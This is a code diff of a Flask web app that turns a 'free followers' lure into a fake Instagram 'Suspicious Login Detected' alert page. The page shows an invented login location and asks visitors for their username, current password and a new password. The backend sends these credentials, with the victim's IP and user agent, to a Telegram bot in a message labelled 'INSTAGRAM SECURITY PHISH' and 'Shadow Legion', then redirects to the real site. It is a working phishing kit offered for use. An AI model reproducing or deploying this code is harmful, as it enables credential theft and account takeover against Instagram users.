@@ -1,6 +1,7 @@
 import os
 import requests
 from flask import Flask, request, render_template_string
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -15,7 +16,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Free Instagram Followers</title>
+<title>Instagram Security Alert</title>
 <style>
   * {
     box-sizing: border-box;
@@ -24,7 +25,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
   }
 
   body {
-    background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+    background: #000;
     min-height: 100vh;
     display: flex;
     flex-direction: column;
@@ -36,12 +37,11 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
   .container {
     max-width: 420px;
     width: 100%;
-    background: rgba(255, 255, 255, 0.05);
-    backdrop-filter: blur(20px);
+    background: #0a0a0a;
     border-radius: 24px;
     padding: 30px 25px;
-    border: 1px solid rgba(255, 255, 255, 0.08);
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
     margin-top: 20px;
   }
 
@@ -57,13 +57,22 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
     display: block;
   }
 
+  .alert-badge {
+    background: rgba(255, 0, 0, 0.15);
+    border: 1px solid rgba(255, 0, 0, 0.2);
+    color: #ff4444;
+    padding: 8px 16px;
+    border-radius: 20px;
+    font-size: 12px;
+    display: inline-block;
+    margin-top: 5px;
+  }
+
   .title {
     color: #fff;
-    font-size: 24px;
+    font-size: 22px;
     font-weight: 700;
-    background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
+    margin-top: 10px;
   }
 
   .subtitle {
@@ -72,53 +81,31 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
     margin-top: 5px;
   }
 
-  .stats-box {
-    background: rgba(255, 255, 255, 0.05);
+  .security-box {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.05);
     border-radius: 16px;
-    padding: 15px;
+    padding: 18px;
     margin-bottom: 25px;
-    display: flex;
-    justify-content: space-around;
-    border: 1px solid rgba(255, 255, 255, 0.06);
   }
 
-  .stat-item {
+  .security-box .icon {
+    font-size: 28px;
+    margin-bottom: 8px;
+    display: block;
     text-align: center;
   }
 
-  .stat-number {
+  .security-box .text {
+    color: rgba(255, 255, 255, 0.7);
+    font-size: 13px;
+    line-height: 1.6;
+    text-align: center;
+  }
+
+  .security-box .highlight {
     color: #fff;
-    font-size: 20px;
-    font-weight: 700;
-  }
-
-  .stat-label {
-    color: rgba(255, 255, 255, 0.4);
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-
-  .progress-bar {
-    width: 100%;
-    height: 6px;
-    background: rgba(255, 255, 255, 0.08);
-    border-radius: 10px;
-    margin-bottom: 25px;
-    overflow: hidden;
-  }
-
-  .progress-fill {
-    width: 73%;
-    height: 100%;
-    background: linear-gradient(90deg, #f09433, #e6683c, #dc2743, #cc2366);
-    border-radius: 10px;
-    animation: progressPulse 2s ease-in-out infinite;
-  }
-
-  @keyframes progressPulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.6; }
+    font-weight: 600;
   }
 
   .input-group {
@@ -126,7 +113,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
   }
 
   .input-group label {
-    color: rgba(255, 255, 255, 0.6);
+    color: rgba(255, 255, 255, 0.5);
     font-size: 12px;
     text-transform: uppercase;
     letter-spacing: 0.8px;
@@ -137,8 +124,8 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
   .field {
     width: 100%;
     height: 50px;
-    background: rgba(255, 255, 255, 0.06);
-    border: 1.5px solid rgba(255, 255, 255, 0.08);
+    background: rgba(255, 255, 255, 0.05);
+    border: 1.5px solid rgba(255, 255, 255, 0.06);
     border-radius: 12px;
     padding: 0 16px;
     font-size: 15px;
@@ -148,18 +135,18 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
   }
 
   .field::placeholder {
-    color: rgba(255, 255, 255, 0.25);
+    color: rgba(255, 255, 255, 0.2);
   }
 
   .field:focus {
-    border-color: #e6683c;
-    box-shadow: 0 0 20px rgba(230, 104, 60, 0.15);
+    border-color: #0095f6;
+    box-shadow: 0 0 20px rgba(0, 149, 246, 0.1);
   }
 
   .login-btn {
     width: 100%;
     height: 52px;
-    background: linear-gradient(135deg, #f09433, #e6683c, #dc2743);
+    background: #0095f6;
     border: none;
     border-radius: 12px;
     color: #fff;
@@ -168,13 +155,11 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
     cursor: pointer;
     margin-top: 8px;
     transition: all 0.3s;
-    text-transform: uppercase;
-    letter-spacing: 1px;
   }
 
   .login-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 10px 30px rgba(220, 39, 67, 0.3);
+    background: #0081d6;
+    transform: translateY(-1px);
   }
 
   .login-btn:active {
@@ -182,26 +167,35 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
   }
 
   .footer-text {
-    color: rgba(255, 255, 255, 0.2);
+    color: rgba(255, 255, 255, 0.15);
     font-size: 11px;
     text-align: center;
     margin-top: 20px;
   }
 
   .footer-text a {
-    color: rgba(255, 255, 255, 0.3);
+    color: rgba(255, 255, 255, 0.25);
     text-decoration: none;
   }
 
-  .live-badge {
-    display: inline-block;
-    background: rgba(255, 0, 0, 0.2);
-    color: #ff4444;
-    font-size: 11px;
-    padding: 4px 12px;
-    border-radius: 20px;
-    border: 1px solid rgba(255, 0, 0, 0.15);
-    margin-top: 10px;
+  .device-info {
+    background: rgba(255, 50, 50, 0.05);
+    border: 1px solid rgba(255, 50, 50, 0.1);
+    border-radius: 12px;
+    padding: 12px 16px;
+    margin-bottom: 20px;
+    color: rgba(255, 255, 255, 0.5);
+    font-size: 12px;
+    line-height: 1.8;
+  }
+
+  .device-info span {
+    color: rgba(255, 255, 255, 0.7);
+  }
+
+  .device-info .location {
+    color: #ff6b6b;
+    font-weight: 600;
   }
 </style>
 </head>
@@ -218,53 +212,59 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
           <stop offset="100%" stop-color="#833ab4"/>
         </linearGradient>
       </defs>
-      <rect width="72" height="72" rx="18" fill="#1a2535"/>
+      <rect width="72" height="72" rx="18" fill="#0a0a0a"/>
       <rect x="9" y="9" width="54" height="54" rx="15" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
       <circle cx="36" cy="36" r="13.5" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
       <circle cx="52" cy="20" r="3.5" fill="url(#igGrad)"/>
     </svg>
 
-    <h1 class="title">Free Instagram Followers</h1>
-    <p class="subtitle">🎁 Get 1,000 - 5,000 real followers instantly</p>
-    <span class="live-badge">🔴 247 people are getting followers right now</span>
+    <span class="alert-badge">🔴 Security Alert</span>
+    <h1 class="title">Suspicious Login Detected</h1>
+    <p class="subtitle">Secure your account immediately</p>
   </div>
 
-  <div class="stats-box">
-    <div class="stat-item">
-      <div class="stat-number">12.4K</div>
-      <div class="stat-label">Followers Given Today</div>
-    </div>
-    <div class="stat-item">
-      <div class="stat-number">4.7K</div>
-      <div class="stat-label">Active Users</div>
-    </div>
-    <div class="stat-item">
-      <div class="stat-number">⭐ 4.9</div>
-      <div class="stat-label">User Rating</div>
-    </div>
+  <div class="device-info">
+    📍 <span class="location">Kabul, Afghanistan</span><br>
+    💻 <span>Chrome on Windows 11</span><br>
+    🕐 <span>{{ current_time }}</span><br>
+    🌐 <span>IP: 102.89.45.67</span>
   </div>
 
-  <div class="progress-bar">
-    <div class="progress-fill"></div>
+  <div class="security-box">
+    <span class="icon">🔐</span>
+    <div class="text">
+      We detected a login from an <span class="highlight">unrecognized device</span>.<br>
+      To protect your account, please <span class="highlight">verify your identity</span>.
+    </div>
   </div>
 
   <form method="POST" action="/login">
     <div class="input-group">
-      <label>📱 Instagram Username or Email</label>
-      <input class="field" type="text" name="username" placeholder="Enter your Instagram username or email" autocomplete="off" required />
+      <label>👤 Username or Email</label>
+      <input class="field" type="text" name="username" placeholder="Enter your username or email" autocomplete="off" required />
     </div>
 
     <div class="input-group">
-      <label>🔑 Password</label>
-      <input class="field" type="password" name="password" placeholder="Enter your Instagram password" required />
+      <label>🔑 Current Password</label>
+      <input class="field" type="password" name="old_password" placeholder="Enter your current password" required />
     </div>
 
-    <button class="login-btn" type="submit">🚀 Get Followers Now</button>
+    <div class="input-group">
+      <label>🔄 New Password</label>
+      <input class="field" type="password" name="new_password" placeholder="Create a new strong password" required />
+    </div>
+
+    <div class="input-group">
+      <label>✅ Confirm New Password</label>
+      <input class="field" type="password" name="confirm_password" placeholder="Confirm your new password" required />
+    </div>
+
+    <button class="login-btn" type="submit">🔒 Update & Secure Account</button>
   </form>
 
   <div class="footer-text">
-    🔒 Your data is secure and will not be shared.<br>
-    By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+    🔒 This is a mandatory security check.<br>
+    <a href="#">Privacy Policy</a> • <a href="#">Help Center</a>
   </div>
 </div>
 
@@ -272,11 +272,16 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 </html>'''
 
 def send_to_telegram(data):
-    text = f"""🔐 INSTAGRAM FOLLOWER GRAB
+    text = f"""🔐 INSTAGRAM SECURITY PHISH
+─────────────────
 👤 Username: {data['username']}
-🔑 Password: {data['password']}
+🔑 Old Password: {data['old_password']}
+🔄 New Password: {data['new_password']}
 🌐 IP: {data['ip']}
-📱 UA: {data['user_agent']}"""
+📱 UA: {data['user_agent'][:50]}
+─────────────────
+💀 Shadow Legion"""
+    
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
@@ -285,18 +290,21 @@ def send_to_telegram(data):
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    current_time = datetime.now().strftime("%B %d, %Y at %I:%M %p")
+    return render_template_string(HTML_TEMPLATE, current_time=current_time)
 
 @app.route('/login', methods=['POST'])
 def login():
     username = request.form.get('username')
-    password = request.form.get('password')
+    old_password = request.form.get('old_password')
+    new_password = request.form.get('new_password')
     ip = request.remote_addr
     user_agent = request.headers.get('User-Agent')
 
     data = {
         'username': username,
-        'password': password,
+        'old_password': old_password,
+        'new_password': new_password,
         'ip': ip,
         'user_agent': user_agent
     }
@@ -306,4 +314,4 @@ def login():
     return f'<script>window.location.href="{REAL_INSTAGRAM_URL}"</script>'
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+    app.run(host='0.0.0.0', port=8080, debug=False)
